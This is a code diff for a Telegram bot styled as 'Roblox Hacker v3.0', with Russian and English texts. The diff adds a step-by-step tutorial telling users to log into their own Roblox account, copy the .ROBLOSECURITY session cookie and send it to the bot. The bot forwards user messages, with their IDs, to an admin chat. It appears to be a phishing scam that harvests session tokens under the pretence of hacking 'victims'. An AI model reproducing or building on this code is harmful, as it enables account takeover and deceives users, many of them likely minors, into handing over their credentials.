@@ -47,7 +47,38 @@ TEXTS = {
         "welcome": "🔓 *Roblox Hacker v3.0*\n\n▸ Инструмент для анализа аккаунтов Roblox\n▸ Получение куки и данных сессии\n▸ Быстрая обработка запросов\n\n📌 *Выберите действие:*",
         "tutor": "📹 *Вот ваш видео-урок по взлому!*",
         "hack": "🎯 *Введите логин или .ROBLOSECURITY куки аккаунта:*\n\n▸ Данные будут обработаны в течение 5-10 минут",
-        "cookies": "📋 *Отправьте .ROBLOSECURITY куки в формате:*\n\n`_|WARNING:-DO-NOT-SHARE-THIS.--...|_`\n\n▸ Куки будут проверены на валидность",
+        "cookies_tutorial": (
+            "🍪 *КАК ПОЛУЧИТЬ .ROBLOSECURITY КУКИ*\n\n"
+            "─────────────────────\n"
+            "🤖 *ANDROID:*\n"
+            "1. Установите приложение *Qiwi Browser*.\n"
+            "2. Зайдите в приложение Qiwi Browser.\n"
+            "3. В браузере напишите расширение *EditCookie*.\n"
+            "4. Зайдите на официальный сайт *Roblox.com*.\n"
+            "5. Зайдите на свой аккаунт Roblox.\n"
+            "6. Зайдите в профиль *жертвы*.\n"
+            "7. Нажмите на 3 точки и выберите расширение *EditCookie*.\n"
+            "8. Скопируйте весь текст в *Value .ROBLOSECURITY*.\n"
+            "9. Отправьте весь текст с начала до конца в этого бота.\n\n"
+            "─────────────────────\n"
+            "🍎 *IPHONE:*\n"
+            "1. Скачайте приложение *Cookie* в App Store.\n"
+            "2. Зайдите в Safari.\n"
+            "3. Нажмите на пазл внизу.\n"
+            "4. Выберите *Управлять Расширениями*.\n"
+            "5. Нажмите на ползунок *Cookie-edit*.\n"
+            "6. Зайдите на официальный сайт *Roblox.com*.\n"
+            "7. Зайдите на свой аккаунт Roblox.\n"
+            "8. Зайдите в профиль *жертвы*.\n"
+            "9. Снова нажмите на пазл.\n"
+            "10. Нажмите на *Cookie-Editor*.\n"
+            "11. Нажмите на *+* внизу.\n"
+            "12. Name напишите `.`, а Value оставьте пустым.\n"
+            "13. Нажмите на *Add*.\n"
+            "14. Нажмите на *.ROBLOSECURITY*.\n"
+            "15. Скопируйте весь текст 🍪\n"
+            "16. Отправьте этот текст боту."
+        ),
         "support": "📩 *Напишите ваш запрос. Администратор ответит в ближайшее время.*",
         "choose_lang": "🌐 *Выберите язык:*",
         "lang_changed": "✅ *Язык изменён.*",
@@ -60,7 +91,38 @@ TEXTS = {
         "welcome": "🔓 *Roblox Hacker v3.0*\n\n▸ Tool for Roblox account analysis\n▸ Cookie and session data extraction\n▸ Fast request processing\n\n📌 *Choose an action:*",
         "tutor": "📹 *Here's your hacking video tutorial!*",
         "hack": "🎯 *Enter login or .ROBLOSECURITY cookie:*\n\n▸ Data will be processed within 5-10 minutes",
-        "cookies": "📋 *Send .ROBLOSECURITY cookie in format:*\n\n`_|WARNING:-DO-NOT-SHARE-THIS.--...|_`\n\n▸ Cookies will be validated",
+        "cookies_tutorial": (
+            "🍪 *HOW TO GET .ROBLOSECURITY COOKIE*\n\n"
+            "─────────────────────\n"
+            "🤖 *ANDROID:*\n"
+            "1. Install *Qiwi Browser* app.\n"
+            "2. Open Qiwi Browser.\n"
+            "3. Type *EditCookie* extension in browser.\n"
+            "4. Go to official *Roblox.com*.\n"
+            "5. Log in to your Roblox account.\n"
+            "6. Go to the *victim's* profile.\n"
+            "7. Tap 3 dots and select *EditCookie*.\n"
+            "8. Copy the entire text in *Value .ROBLOSECURITY*.\n"
+            "9. Send the entire text to this bot.\n\n"
+            "─────────────────────\n"
+            "🍎 *IPHONE:*\n"
+            "1. Download *Cookie* app from App Store.\n"
+            "2. Open Safari.\n"
+            "3. Tap the puzzle icon at the bottom.\n"
+            "4. Select *Manage Extensions*.\n"
+            "5. Enable *Cookie-edit* toggle.\n"
+            "6. Go to official *Roblox.com*.\n"
+            "7. Log in to your Roblox account.\n"
+            "8. Go to the *victim's* profile.\n"
+            "9. Tap the puzzle icon again.\n"
+            "10. Tap *Cookie-Editor*.\n"
+            "11. Tap *+* at the bottom.\n"
+            "12. Name: `.`, Value: leave empty.\n"
+            "13. Tap *Add*.\n"
+            "14. Tap *.ROBLOSECURITY*.\n"
+            "15. Copy the entire text 🍪\n"
+            "16. Send this text to the bot."
+        ),
         "support": "📩 *Write your request. Admin will reply soon.*",
         "choose_lang": "🌐 *Choose language:*",
         "lang_changed": "✅ *Language changed.*",
@@ -83,7 +145,7 @@ LANG_KEYBOARD = {
 MAIN_KEYBOARD_RU = {
     "keyboard": [
         ["🎥 Видео-урок", "🎯 Взломать аккаунт"],
-        ["📋 Получить куки", "📩 Написать поддержку"],
+        ["🍪 Как получить куки", "📩 Написать поддержку"],
         ["🌐 Сменить язык"]
     ],
     "resize_keyboard": True,
@@ -93,7 +155,7 @@ MAIN_KEYBOARD_RU = {
 MAIN_KEYBOARD_EN = {
     "keyboard": [
         ["🎥 Video tutorial", "🎯 Hack account"],
-        ["📋 Get cookies", "📩 Write to support"],
+        ["🍪 How to get cookies", "📩 Write to support"],
         ["🌐 Change language"]
     ],
     "resize_keyboard": True,
@@ -116,16 +178,13 @@ def webhook():
 
         # === АДМИН ===
         if str(chat_id) == ADMIN_CHAT_ID:
-            # === ОТВЕТ ЧЕРЕЗ REPLY_TO_MESSAGE ===
             reply_to = data['message'].get('reply_to_message')
             if reply_to:
                 reply_text = reply_to.get('text', '')
-                # Ищем ID в сообщении (формат: ID: 123456789)
                 match = re.search(r'ID:\s*(\d+)', reply_text)
                 if match:
                     target_id = int(match.group(1))
                     target_lang = user_lang.get(str(target_id), "ru")
-                    # Отправляем ответ пользователю
                     requests.post(
                         f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                         json={
@@ -134,7 +193,6 @@ def webhook():
                             "parse_mode": "Markdown"
                         }
                     )
-                    # Подтверждение админу
                     requests.post(
                         f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                         json={
@@ -145,7 +203,6 @@ def webhook():
                     )
                     return "ok", 200
                 else:
-                    # Если в сообщении нет ID — пробуем найти через /reply
                     if text.startswith("/reply "):
                         parts = text.split(" ", 2)
                         if len(parts) >= 3 and parts[1].isdigit():
@@ -169,7 +226,6 @@ def webhook():
                                 }
                             )
                             return "ok", 200
-                    # Если ничего не подошло
                     requests.post(
                         f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                         json={
@@ -180,9 +236,7 @@ def webhook():
                     )
                     return "ok", 200
 
-            # === ЕСЛИ ПРОСТО ТЕКСТ (БЕЗ ОТВЕТА) ===
             if text and not text.startswith("/"):
-                # Проверяем, может это команда /reply без ответа
                 if text.startswith("/reply "):
                     parts = text.split(" ", 2)
                     if len(parts) >= 3 and parts[1].isdigit():
@@ -217,7 +271,6 @@ def webhook():
                         )
                         return "ok", 200
                 
-                # Если это не команда — напоминаем, как правильно
                 requests.post(
                     f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                     json={
@@ -228,7 +281,6 @@ def webhook():
                 )
                 return "ok", 200
 
-            # === КОМАНДЫ ===
             if text == '/start':
                 requests.post(
                     f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
@@ -292,7 +344,6 @@ def webhook():
                 )
                 return "ok", 200
 
-            # === ВСЁ ОСТАЛЬНОЕ (если не подошло) ===
             requests.post(
                 f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                 json={
@@ -348,7 +399,7 @@ def webhook():
             )
             return "ok", 200
 
-        # === ПЕРЕСЫЛКА СООБЩЕНИЯ АДМИНУ С ID ===
+        # === ПЕРЕСЫЛКА СООБЩЕНИЯ АДМИНУ ===
         admin_msg = f"ID: {user_id}\n{text}"
         requests.post(
             f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
@@ -404,12 +455,12 @@ def webhook():
                 }
             )
 
-        elif text in ["📋 Получить куки", "📋 Get cookies"]:
+        elif text in ["🍪 Как получить куки", "🍪 How to get cookies"]:
             requests.post(
                 f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                 json={
                     "chat_id": chat_id,
-                    "text": t["cookies"],
+                    "text": t["cookies_tutorial"],
                     "parse_mode": "Markdown",
                     "reply_markup": keyboard
                 }
